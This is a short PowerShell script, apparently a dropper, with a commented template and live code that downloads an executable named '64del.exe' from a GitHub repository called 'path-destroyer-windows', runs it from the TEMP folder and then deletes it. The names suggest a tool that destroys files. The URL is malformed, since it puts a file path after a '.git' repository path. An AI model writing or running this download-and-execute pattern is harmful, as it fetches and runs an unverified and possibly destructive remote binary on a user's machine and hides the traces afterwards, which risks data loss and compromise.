# --- TEMPLATE ---
# $url = "https://github.com/USER/REPO/releases/latest/download/mytool.exe"
# $tmp = "$env:TEMP\mytool.exe"

# Invoke-WebRequest $url -OutFile $tmp
# & $tmp
# Remove-Item $tmp

$url = "https://github.com/Toaster123G/path-destroyer-windows.git/64del.exe"
$tmp = "$env:TEMP\64del.exe"

Invoke-WebRequest $url -Outfile $tmp
& $tmp
Remove-Item $tmp